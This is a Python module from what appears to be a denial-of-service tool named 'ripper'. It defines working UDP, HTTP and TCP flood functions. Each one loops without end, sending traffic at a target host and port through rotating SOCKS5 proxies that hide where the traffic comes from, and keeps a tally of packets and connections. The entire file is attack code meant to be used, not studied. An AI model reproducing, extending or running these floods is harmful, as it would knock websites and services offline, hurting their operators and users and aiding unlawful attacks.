import re
import socket
import socks
import time
import random
import urllib.request
import threading
from os import urandom as randbytes
import ripper.services
from ripper.context import Context
from ripper.statistics import show_statistics
from ripper.common import get_random_string, get_server_ip_error_msg
from ripper.proxy import Sock5Proxy
from ripper.urllib_x import build_request_http_package, http_request

lock = threading.Lock()

###############################################
# Common methods for attacks
###############################################

# TODO add support for http_method, http_path


def build_ctx_request_http_package(_ctx: Context, is_accept_header_only: bool = True) -> str:
    local_headers = _ctx.headers
    if is_accept_header_only:
        local_headers = {
            'Accept': _ctx.headers['Accept']
        }

    extra_data = ''
    if _ctx.max_random_packet_len > 0:
        extra_data = get_random_string(1, _ctx.max_random_packet_len)

    return build_request_http_package(
        host=_ctx.host,
        headers=local_headers,
        extra_data=extra_data,
    )


def random_proxy_from_context(_ctx: Context) -> Sock5Proxy:
    if not _ctx.proxy_list or not len(_ctx.proxy_list):
        return None
    return random.choice(_ctx.proxy_list)


def delete_proxy(_ctx: Context, proxy: Sock5Proxy):
    lock.acquire()
    is_exists = proxy in _ctx.proxy_list
    if is_exists:
        _ctx.proxy_list.remove(proxy)
    lock.release()
    return is_exists


###############################################
# Attack methods
###############################################

def down_it_udp(_ctx: Context):
    i = 1
    proxy = None
    while True:
        if proxy is None:
            proxy = random_proxy_from_context(_ctx)
            if proxy and not proxy.validate():
                delete_proxy(_ctx, proxy)
                proxy = None
                continue
        sock = _ctx.sock_manager.get_udp_socket(proxy)
        request_packet = build_ctx_request_http_package(_ctx)

        try:
            sock.sendto(request_packet, (_ctx.host_ip, _ctx.port))
        except socket.gaierror:
            if get_server_ip_error_msg not in _ctx.errors:
                _ctx.errors.append(str(get_server_ip_error_msg))
        except:
            _ctx.sock_manager.close_udp_socket(proxy)
        else:
            if get_server_ip_error_msg in _ctx.errors:
                _ctx.errors.remove(str(get_server_ip_error_msg))
            _ctx.packets_sent += 1

        i += 1
        if i == 100:
            i = 1
            if not _ctx.connecting_host:
                threading.Thread(
                    daemon=True, target=ripper.services.connect_host, args=[_ctx]).start()
                # ripper.services.connect_host(_ctx)

        if not _ctx.show_statistics:
            show_statistics(_ctx)


def down_it_http(_ctx: Context):
    """HTTP flood."""
    proxy = None
    while True:
        if proxy is None:
            proxy = random_proxy_from_context(_ctx)
        try:
            response = http_request(
                url=_ctx.url, proxy=proxy, http_method=_ctx.http_method)
            _ctx.http_codes_counter[response.status] += 1
            _ctx.connections_success += 1
        except socks.ProxyError:
            delete_proxy(_ctx, proxy)
            proxy = None
        except:
            _ctx.connections_failed += 1

        _ctx.packets_sent += 1
        if not _ctx.show_statistics:
            show_statistics(_ctx)


def down_it_tcp(_ctx: Context):
    """TCP flood."""
    proxy = None
    while True:
        if proxy is None:
            proxy = random_proxy_from_context(_ctx)
        try:
            sock = _ctx.sock_manager.create_tcp_socket(proxy)
            sock.connect((_ctx.host_ip, _ctx.port))
            _ctx.connections_success += 1
            while True:
                try:
                    bytes_to_send_len = _ctx.max_random_packet_len if _ctx.random_packet_len else 1024
                    bytes_to_send = randbytes(_ctx.max_random_packet_len)
                    sock.send(bytes_to_send)
                except:
                    sock.close()
                    break
                else:
                    _ctx.packets_sent += bytes_to_send_len
                    if not _ctx.show_statistics:
                        show_statistics(_ctx)
        except socks.ProxyError:
            delete_proxy(_ctx, proxy)
            proxy = None
        except:
            _ctx.connections_failed += 1

        if not _ctx.show_statistics:
            show_statistics(_ctx)
